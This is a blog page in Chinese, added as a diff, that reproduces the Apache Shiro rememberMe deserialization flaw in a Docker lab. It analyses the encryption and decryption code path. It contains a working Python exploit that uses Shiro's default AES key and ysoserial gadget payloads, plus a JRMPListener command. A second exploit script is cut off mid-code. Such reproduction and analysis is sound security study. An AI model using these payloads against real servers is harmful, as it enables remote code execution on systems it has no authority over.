@@ -1,0 +1,635 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('http://yoursite.com').hostname,
+    root: '/',
+    scheme: 'Mist',
+    version: '7.6.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="只要rememberMe的AES加密密钥泄露，无论shiro是什么版本都会导致反序列化漏洞。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="shiro 反序列化复现">
+<meta property="og:url" content="http://yoursite.com/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="李三的剑谱">
+<meta property="og:description" content="只要rememberMe的AES加密密钥泄露，无论shiro是什么版本都会导致反序列化漏洞。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/1568432319724.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/1568433547267.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/1568434183366.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/1568434273648.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/1568434542261.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/1568443220292.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/1568444817925.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/1568444950433.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/1568445232222.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/1568445611986.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/1568445398785.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/1568445712016.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/1568446509804.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/1568448908855.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/1568448343266.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/1568449252836.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/1568449190079.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/1568450997092.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/1568467325645.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/1568467351639.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/1568454878837.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/1568643856640.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/1568479508256.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/1568454945784.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/1568551239961.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/1568551376077.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/1568796705290.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/1568646188492.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/1568646208505.png">
+<meta property="article:published_time" content="2019-09-19T16:00:00.000Z">
+<meta property="article:modified_time" content="2019-12-21T13:01:10.647Z">
+<meta property="article:author" content="李三（cl0und）">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/1568432319724.png">
+
+<link rel="canonical" href="http://yoursite.com/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>shiro 反序列化复现 | 李三的剑谱</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="李三的剑谱" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">李三的剑谱</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="Searching..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/20/shiro%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="李三（cl0und）">
+      <meta itemprop="description" content="人若无名，便可专心练剑">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="李三的剑谱">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          shiro 反序列化复现
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2019-09-20 00:00:00" itemprop="dateCreated datePublished" datetime="2019-09-20T00:00:00+08:00">2019-09-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-12-21 21:01:10" itemprop="dateModified" datetime="2019-12-21T21:01:10+08:00">2019-12-21</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web-security/" itemprop="url" rel="index">
+                    <span itemprop="name">web security</span>
+                  </a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>20k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>18 mins.</span>
+            </span>
+            <div class="post-description">只要rememberMe的AES加密密钥泄露，无论shiro是什么版本都会导致反序列化漏洞。</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="利用环境搭建"><a href="#利用环境搭建" class="headerlink" title="利用环境搭建"></a>利用环境搭建</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull medicean/vulapps:s_shiro_1</span><br><span class="line">docker run -d -p 80:8080 medicean/vulapps:s_shiro_1</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h2><p>只要rememberMe的AES加密密钥泄露，无论shiro是什么版本都会导致反序列化漏洞。</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">JAR_FILE = <span class="string">'/Users/Viarus/Downloads/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url, rce_command)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'://'</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">        target = <span class="string">'https://%s'</span> % url <span class="keyword">if</span> <span class="string">':443'</span> <span class="keyword">in</span> url <span class="keyword">else</span> <span class="string">'http://%s'</span> % url</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        target = url</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = generator(rce_command, JAR_FILE)  <span class="comment"># 生成payload</span></span><br><span class="line">        r = requests.get(target, cookies=&#123;<span class="string">'rememberMe'</span>: payload.decode()&#125;, timeout=<span class="number">10</span>)  <span class="comment"># 发送验证请求</span></span><br><span class="line">        <span class="keyword">print</span> r.text</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generator</span><span class="params">(command, fp)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(fp):</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">'jar file not found!'</span>)</span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, fp, <span class="string">'CommonsCollections2'</span>, command],</span><br><span class="line">                             stdout=subprocess.PIPE)</span><br><span class="line">    BS = AES.block_size</span><br><span class="line">    pad = <span class="keyword">lambda</span> s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()</span><br><span class="line">    key = <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span></span><br><span class="line">    mode = AES.MODE_CBC</span><br><span class="line">    iv = uuid.uuid4().bytes</span><br><span class="line">    encryptor = AES.new(base64.b64decode(key), mode, iv)</span><br><span class="line">    file_body = pad(popen.stdout.read())</span><br><span class="line">    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">    <span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	<span class="comment">#http://www.jackson-t.ca/runtime-exec-payloads.html</span></span><br><span class="line">    poc(<span class="string">'http://127.0.0.1:8080'</span>, <span class="string">'open /Applications/Calculator.app'</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="动态分析环境搭建"><a href="#动态分析环境搭建" class="headerlink" title="动态分析环境搭建"></a>动态分析环境搭建</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;apache&#x2F;shiro.git</span><br><span class="line">git checkout shiro-root-1.2.4</span><br><span class="line">cd .&#x2F;shiro&#x2F;samples&#x2F;web</span><br></pre></td></tr></table></figure>
+
+<p>mac 安装jdk6 <a href="https://juejin.im/post/5d550c5d51882504fb3022f7" target="_blank" rel="noopener">https://juejin.im/post/5d550c5d51882504fb3022f7</a><br>为了能动态调试需要在<code>shiro/samples/web</code>中添加</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--  需要设置编译的版本 --&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">           <span class="comment">&lt;!--  这里需要将jstl设置为1.2 --&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span> </span><br><span class="line">           <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">       <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><img src="./1568432319724.png" alt="Alt text"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line"></span><br><span class="line">&lt;toolchains xmlns&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;TOOLCHAINS&#x2F;1.1.0&quot; xmlns:xsi&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2001&#x2F;XMLSchema-instance&quot;</span><br><span class="line">  xsi:schemaLocation&#x3D;&quot;http:&#x2F;&#x2F;maven.apache.org&#x2F;TOOLCHAINS&#x2F;1.1.0 http:&#x2F;&#x2F;maven.apache.org&#x2F;xsd&#x2F;toolchains-1.1.0.xsd&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--插入下面代码--&gt;</span><br><span class="line">  &lt;toolchain&gt;</span><br><span class="line">    &lt;type&gt;jdk&lt;&#x2F;type&gt;</span><br><span class="line">    &lt;provides&gt;</span><br><span class="line">      &lt;version&gt;1.6&lt;&#x2F;version&gt;</span><br><span class="line">      &lt;vendor&gt;sun&lt;&#x2F;vendor&gt;</span><br><span class="line">    &lt;&#x2F;provides&gt;</span><br><span class="line">    &lt;configuration&gt;</span><br><span class="line">        &lt;!--这里是你安装jdk的文件目录--&gt;</span><br><span class="line">      &lt;jdkHome&gt;&#x2F;Library&#x2F;Java&#x2F;JavaVirtualMachines&#x2F;1.6.0.jdk&#x2F;&lt;&#x2F;jdkHome&gt;</span><br><span class="line">    &lt;&#x2F;configuration&gt;</span><br><span class="line">  &lt;&#x2F;toolchain&gt;</span><br><span class="line">&lt;&#x2F;toolchains&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="./1568433547267.png" alt="Alt text"></p>
+<ol>
+<li>Run</li>
+<li>Edit Configurations </li>
+<li>添加TomcatServer(Local) </li>
+<li>Server中配置Tomcat路径 </li>
+<li>Deployment中添加Artifact</li>
+<li>选择sample-web:war exploded</li>
+</ol>
+<p><img src="./1568434183366.png" alt="Alt text"><br><img src="./1568434273648.png" alt="Alt text"><br><img src="./1568434542261.png" alt="Alt text"></p>
+<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>根据<a href="https://issues.apache.org/jira/browse/SHIRO-550" target="_blank" rel="noopener">官网的叙述</a>比较清楚了<br><img src="./1568443220292.png" alt="Alt text"></p>
+<h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p>convertPrincipalsToBytes<br><img src="./1568444817925.png" alt="Alt text"></p>
+<p>序列化具体<br><img src="./1568444950433.png" alt="Alt text"></p>
+<p>加密具体<br><img src="./1568445232222.png" alt="Alt text"></p>
+<p>加密用到encryptionCipherKey在构造方法中确定，其实就是DEFAULT_CIPHER_KEY_BYTES<br><img src="./1568445611986.png" alt="Alt text"><br><img src="./1568445398785.png" alt="Alt text"></p>
+<p>加密用到的cipherService在对象初始化的时候确定为Aes加密<br><img src="./1568445712016.png" alt="Alt text"><br><img src="./1568446509804.png" alt="Alt text"></p>
+<p>调用栈<br><img src="./1568448908855.png" alt="Alt text"></p>
+<h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p>getRememberedPrincipals<br><img src="./1568448343266.png" alt="Alt text"></p>
+<p>反序列化的起点<br><img src="./1568449252836.png" alt="Alt text"></p>
+<p>调用栈<br><img src="./1568449190079.png" alt="Alt text"></p>
+<h2 id="漏洞的原生利用"><a href="#漏洞的原生利用" class="headerlink" title="漏洞的原生利用"></a>漏洞的原生利用</h2><p>shiro自带的包是commons-collections3.2.1<br><img src="./1568450997092.png" alt="Alt text"></p>
+<p>其实原生情况下直接用ysoserial打会出现报错<br><img src="./1568467325645.png" alt="Alt text"><br><img src="./1568467351639.png" alt="Alt text"></p>
+<p>报错的原因是<br><img src="./1568454878837.png" alt="Alt text"><br><img src="./1568643856640.png" alt="Alt text"></p>
+<p>最开始的可以打成功的原因是，为了方便进行复现，搭建环境时手动添加了ysoserial支持的commons-collections4，所以复现起来才和喝水一样简单（橘子师傅原话）<br><img src="./1568479508256.png" alt="Alt text"></p>
+<p>解决这种问题的办法是使用JRMP，至于原因应该是<br><img src="./1568454945784.png" alt="Alt text"><br><img src="./1568551239961.png" alt="Alt text"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 4444 CommonsCollections5 &#39;touch &#x2F;tmp&#x2F;hack_shiro_jrmp&#39;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">JAR_FILE = <span class="string">'/Users/cengsiqi/Desktop/pentest/ysoserial-0.0.6-SNAPSHOT-all.jar'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">poc</span><span class="params">(url, JRMPServerIp)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'://'</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line"> 